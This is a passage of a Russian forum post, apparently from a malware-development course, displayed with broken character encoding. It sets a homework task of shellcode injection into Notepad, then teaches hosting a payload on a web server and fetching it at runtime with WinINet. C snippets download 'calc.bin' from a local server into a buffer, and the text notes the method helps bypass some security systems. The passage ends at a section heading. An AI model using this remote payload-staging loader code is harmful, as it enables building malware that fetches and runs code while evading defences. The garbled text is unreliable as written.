–í –∫–∞—á–µ—Å—Ç–≤–µ –¥–æ–º–∞—à–Ω–µ–≥–æ –∑–∞–¥–∞–Ω–∏—è, –ø—Ä–µ–¥–ª–∞–≥–∞—é –Ω–∞–ø–∏—Å–∞—Ç—å –ø—Ä–æ–µ–∫—Ç –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –∏ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –ø—Ä–æ–≤–µ—Å—Ç–∏ –æ—Ç–ª–∞–¥–∫—É –ø–æ –∞–ª–≥–æ—Ä–∏—Ç–º—É –Ω–∏–∂–µ.)<br />
<br />
–î–ª—è –ø—Ä–∏–º–µ—Ä–∞, –∏–Ω—ä–µ–∫—Ü–∏—è shellcode –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤ –ø—Ä–æ—Ü–µ—Å—Å Notepad. –ù–∞—á–Ω–∏—Ç–µ —Å –æ—Ç–∫—Ä—ã—Ç–∏—è Notepad –∏ –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏—Ç–µ –∫ –Ω–µ–º—É –æ—Ç–ª–∞–¥—á–∏–∫ x64 xdbg.<br />
<ol>
<li data-xf-list-type="ol"><b>–ó–∞–ø—É—Å–∫ Notepad –∏ xdbg.</b> –ó–∞–ø—É—Å—Ç–∏—Ç–µ Notepad. –û—Ç–∫—Ä–æ–π—Ç–µ xdbg –∏ –≤—ã–±–µ—Ä–∏—Ç–µ &quot;File&quot; &gt; &quot;Attach&quot; –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –≥–æ—Ä—è—á—É—é –∫–ª–∞–≤–∏—à—É (–æ–±—ã—á–Ω–æ F2). –í —Å–ø–∏—Å–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω–∞–π–¥–∏—Ç–µ Notepad –∏ –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏—Ç–µ –∫ –Ω–µ–º—É –æ—Ç–ª–∞–¥—á–∏–∫.</li>
<li data-xf-list-type="ol"><b>–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ –∏–Ω—ä–µ–∫—Ü–∏–∏.</b> –ü–µ—Ä–µ–¥ —Ç–µ–º –∫–∞–∫ –Ω–∞—á–∞—Ç—å –∏–Ω—ä–µ–∫—Ü–∏—é shellcode, —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –æ—Ç–ª–∞–¥—á–∏–∫ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ–∂–∏–¥–∞–Ω–∏—è (–ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω).</li>
<li data-xf-list-type="ol"><b>–ü—Ä–æ—Å–º–æ—Ç—Ä –ø–∞–º—è—Ç–∏</b> –û—Ç–∫—Ä–æ–π—Ç–µ –æ–∫–Ω–æ &quot;Memory&quot; –≤ xdbg, —á—Ç–æ–±—ã –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏, –∫—É–¥–∞ –±—ã–ª –∏–Ω—ä–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω shellcode. –≠—Ç–æ –ø–æ–∑–≤–æ–ª–∏—Ç –≤–∞–º –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –æ–Ω —Ä–∞–±–æ—Ç–∞–µ—Ç –∏ —á—Ç–æ –¥–µ–ª–∞–µ—Ç –≤ –ø–∞–º—è—Ç–∏ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
</ol></div>
						

							<h2>–†–∞–∑–º–µ—â–∞–µ–º Payload —É–¥–∞–ª–µ–Ω–Ω–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ</h2>

							

							

							<div class="bbWrapper">–ù–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ –≤—Å–µ—Ö —Å—Ç–∞—Ç–µ–π –¥–æ —Å–∏—Ö –ø–æ—Ä payload –±—ã–ª –ø–æ—Å—Ç–æ—è–Ω–Ω–æ —Ö—Ä–∞–Ω—è—â–∏–º—Å—è –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤–Ω—É—Ç—Ä–∏ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
<br />
–≠—Ç–æ –±—ã—Å—Ç—Ä—ã–π –∏ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –º–µ—Ç–æ–¥ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è payload. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å–ª—É—á–∞—è—Ö, –∫–æ–≥–¥–∞ —Å—É—â–µ—Å—Ç–≤—É—é—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –ø–æ —Ä–∞–∑–º–µ—Ä—É payload, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ payload –≤–Ω—É—Ç—Ä–∏ –∫–æ–¥–∞ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –æ—Å—É—â–µ—Å—Ç–≤–∏–º—ã–º –ø–æ–¥—Ö–æ–¥–æ–º. –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –ø–æ–¥—Ö–æ–¥ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ä–∞–∑–º–µ—â–µ–Ω–∏–∏ payload –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–µ –∏ –µ–≥–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏–∏ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<b>–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –í–µ–±-—Å–µ—Ä–≤–µ—Ä–∞</b><br />
<br />
–≠—Ç–∞ —Å—Ç–∞—Ç—å—è —Ç—Ä–µ–±—É–µ—Ç –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ –¥–ª—è —Ä–∞–∑–º–µ—â–µ–Ω–∏—è —Ñ–∞–π–ª–∞ payload. –°–∞–º—ã–π –ø—Ä–æ—Å—Ç–æ–π —Å–ø–æ—Å–æ–± - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å HTTP-—Å–µ—Ä–≤–µ—Ä Python —Å –ø–æ–º–æ—â—å—é —Å–ª–µ–¥—É—é—â–µ–π –∫–æ–º–∞–Ω–¥—ã:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python -m http.server 8000</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746780522487.png"
		data-src="https://osint42.org/attachments/1746780522487-png.102/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780522487-png.102/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780522487.png"
			title="1746780522487.png"
			width="817" height="328" loading="lazy" />
	</div><br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —Ñ–∞–π–ª payload –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ä–∞–∑–º–µ—â–µ–Ω –≤ —Ç–æ–π –∂–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –≥–¥–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —ç—Ç–∞ –∫–æ–º–∞–Ω–¥–∞.<br />
<br />
–ß—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–∞–±–æ—Ç—É –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞, –ø–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ –∞–¥—Ä–µ—Å—É <a href="http://127.0.0.1:8000/" target="_blank" class="link link--external" rel="noopener">http://127.0.0.1:8000</a> —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –±—Ä–∞—É–∑–µ—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780531242.png"
		data-src="https://osint42.org/attachments/1746780531242-png.103/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780531242-png.103/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780531242.png"
			title="1746780531242.png"
			width="1126" height="444" loading="lazy" />
	</div><br />
<br />
<b>–ü–ª—é—Å—ã –∏ –º–∏–Ω—É—Å—ã –¥–∞–Ω–Ω–æ–≥–æ –º–µ—Ç–æ–¥–∞</b><br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è payload –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ä—è–¥ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤. –í–æ-–ø–µ—Ä–≤—ã—Ö, —ç—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ª–µ–≥–∫–æ –æ–±–Ω–æ–≤–ª—è—Ç—å –∏ –º–µ–Ω—è—Ç—å payload –±–µ–∑ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
–í–æ-–≤—Ç–æ—Ä—ã—Ö, —ç—Ç–æ –º–æ–∂–µ—Ç —É–ø—Ä–æ—Å—Ç–∏—Ç—å –æ–±—Ö–æ–¥ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å–∏—Å—Ç–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –ø–æ—Å–∫–æ–ª—å–∫—É payload –Ω–µ –≤—Å—Ç—Ä–æ–µ–Ω –Ω–∞–ø—Ä—è–º—É—é –≤ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª.<br />
<br />
<b>–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, —Ç–∞–∫–æ–π –ø–æ–¥—Ö–æ–¥ —Ç–∞–∫–∂–µ –∏–º–µ–µ—Ç —Å–≤–æ–∏ –Ω–µ–¥–æ—Å—Ç–∞—Ç–∫–∏. </b><br />
–í–µ–±-—Å–µ—Ä–≤–µ—Ä —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —Ç–æ—á–∫–æ–π, –∏ –µ—Å–ª–∏ –æ–Ω —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã–º –∏–ª–∏ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è, payload –Ω–µ –±—É–¥–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω. –¢–∞–∫–∂–µ –≤–æ–∑—Ä–∞—Å—Ç–∞–µ—Ç —Ä–∏—Å–∫ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –µ—Å–ª–∏ —Å–µ—Ç–µ–≤–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞ –∏–ª–∏ –Ω–µ–æ–±—ã—á–Ω–∞ –¥–ª—è –¥–∞–Ω–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
<b>–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ Payload</b><br />
<br />
–î–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è payload —Å –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ API –¥–ª—è Windows:<br />
<br />
InternetOpenW - –û—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å–µ–∞–Ω—Å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã–º —É—Å–ª–æ–≤–∏–µ–º –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥—Ä—É–≥–∏—Ö –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Ñ—É–Ω–∫—Ü–∏–π Windows.<br />
<br />
InternetOpenUrlW - –û—Ç–∫—Ä—ã–≤–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ä–µ—Å—É—Ä—Å–∞, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è URL payload.<br />
<br />
InternetReadFile - –°—á–∏—Ç—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –≤–µ–±-—Ä–µ—Å—É—Ä—Å–∞. –≠—Ç–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä, –æ—Ç–∫—Ä—ã—Ç—ã–π —Å –ø–æ–º–æ—â—å—é InternetOpenUrlW.<br />
<br />
InternetCloseHandle - –ó–∞–∫—Ä—ã–≤–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä.<br />
<br />
InternetSetOptionW - –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –æ–ø—Ü–∏—é –ò–Ω—Ç–µ—Ä–Ω–µ—Ç–∞.<br />
<br />
<b>–û—Ç–∫—Ä—ã—Ç–∏–µ —Å–µ–∞–Ω—Å–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ </b><br />
<br />
–ü–µ—Ä–≤—ã–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–µ–∞–Ω—Å–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ InternetOpenW, –∫–æ—Ç–æ—Ä–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–π WinINet –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏.<br />
–í—Å–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –ø–µ—Ä–µ–¥–∞–≤–∞–µ–º—ã–µ –≤ WinAPI, —Ä–∞–≤–Ω—ã NULL, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω—ã –¥–ª—è –≤–æ–ø—Ä–æ—Å–æ–≤, —Å–≤—è–∑–∞–Ω–Ω—ã—Ö —Å –ø—Ä–æ–∫—Å–∏.<br />
<br />
–°–ª–µ–¥—É–µ—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Ç–æ—Ä–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ —Ä–∞–≤–Ω—ã–º NULL —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é INTERNET_OPEN_TYPE_PRECONFIG, —á—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—É—â–µ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Å–∏—Å—Ç–µ–º—ã –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ø—Ä–æ–∫—Å–∏ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç—É.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HINTERNET InternetOpenW(
[in] LPCWSTR lpszAgent, // NULL
[in] DWORD dwAccessType, // NULL –∏–ª–∏ INTERNET_OPEN_TYPE_PRECONFIG
[in] LPCWSTR lpszProxy, // NULL
[in] LPCWSTR lpszProxyBypass, // NULL
[in] DWORD dwFlags // NULL
);</code></pre>
	</div>
</div><br />
–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω –≤ —Å–ª–µ–¥—É—é—â–µ–º –æ—Ç—Ä—ã–≤–∫–µ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –û—Ç–∫—Ä—ã—Ç–∏–µ —Å–µ–∞–Ω—Å–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);</code></pre>
	</div>
</div><br />
<b>–û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –¥–ª—è Payload</b><br />
–ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–º—É WinAPI - InternetOpenUrlW, –≥–¥–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å URL payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HINTERNET InternetOpenUrlW(
[in] HINTERNET hInternet, // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä, –æ—Ç–∫—Ä—ã—Ç—ã–π —Å –ø–æ–º–æ—â—å—é InternetOpenW
[in] LPCWSTR lpszUrl, // URL payload
[in] LPCWSTR lpszHeaders, // NULL
[in] DWORD dwHeadersLength, // NULL
[in] DWORD dwFlags, // INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
[in] DWORD_PTR dwContext // NULL
);</code></pre>
	</div>
</div><br />
–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω –≤ —Å–ª–µ–¥—É—é—â–µ–º –æ—Ç—Ä—ã–≤–∫–µ –∫–æ–¥–∞.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);</code></pre>
	</div>
</div><br />
–ü—è—Ç—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä —Ñ—É–Ω–∫—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –∑–∞–ø—Ä–æ—Å–∞ HTTP –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞.<br />
–í–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ–ª–∞–≥–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ INTERNET_FLAG_IGNORE_CERT_CN_INVALID, –Ω–æ —ç—Ç–æ –æ—Å—Ç–∞–µ—Ç—Å—è –Ω–∞ —É—Å–º–æ—Ç—Ä–µ–Ω–∏–µ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞.<br />
–§–ª–∞–≥–∏ —Ö–æ—Ä–æ—à–æ –æ–±—ä—è—Å–Ω–µ–Ω—ã –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft.<br />
<br />
<b>–ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö</b><br />
<br />
–î–∞–ª–µ–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è WinAPI InternetReadFile, –∫–æ—Ç–æ—Ä—ã–π —Å—á–∏—Ç—ã–≤–∞–µ—Ç payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InternetReadFile(
[in] HINTERNET hFile, // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä, –æ—Ç–∫—Ä—ã—Ç—ã–π —Å –ø–æ–º–æ—â—å—é InternetOpenUrlW
[out] LPVOID lpBuffer, // –ë—É—Ñ–µ—Ä –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è payload
[in] DWORD dwNumberOfBytesToRead, // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç –¥–ª—è —á—Ç–µ–Ω–∏—è
[out] LPDWORD lpdwNumberOfBytesRead // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—ã—Ö –±–∞–π—Ç
);</code></pre>
	</div>
</div><br />
–ü–µ—Ä–µ–¥ –≤—ã–∑–æ–≤–æ–º —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–¥–µ–ª–∏—Ç—å –±—É—Ñ–µ—Ä –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è payload. –î–ª—è —ç—Ç–æ–≥–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è LocalAlloc –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ —Ç–æ–π –∂–µ —Ä–∞–∑–º–µ—Ä–Ω–æ—Å—Ç–∏, —á—Ç–æ –∏ payload, 272 –±–∞–π—Ç–∞.<br />
–ü–æ—Å–ª–µ –≤—ã–¥–µ–ª–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å InternetReadFile –¥–ª—è —á—Ç–µ–Ω–∏—è payload. –§—É–Ω–∫—Ü–∏—è —Ç—Ä–µ–±—É–µ—Ç —É–∫–∞–∑–∞–Ω–∏—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –±–∞–π—Ç –¥–ª—è —á—Ç–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Ä–∞–≤–Ω–æ 272.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pBytes = (PBYTE)LocalAlloc(LPTR, 272);
InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)</code></pre>
	</div>
</div><br />
<b>–ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞</b><br />
<br />
–î–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è InternetCloseHandle.<br />
–≠—Ç–æ —Å–ª–µ–¥—É–µ—Ç –≤—ã–∑–≤–∞—Ç—å –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InternetCloseHandle(
[in] HINTERNET hInternet // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä, –æ—Ç–∫—Ä—ã—Ç—ã–π —Å –ø–æ–º–æ—â—å—é InternetOpenW –∏ InternetOpenUrlW
);</code></pre>
	</div>
</div><br />
<b>–ó–∞–∫—Ä—ã—Ç–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π HTTP/S</b><br />
<br />
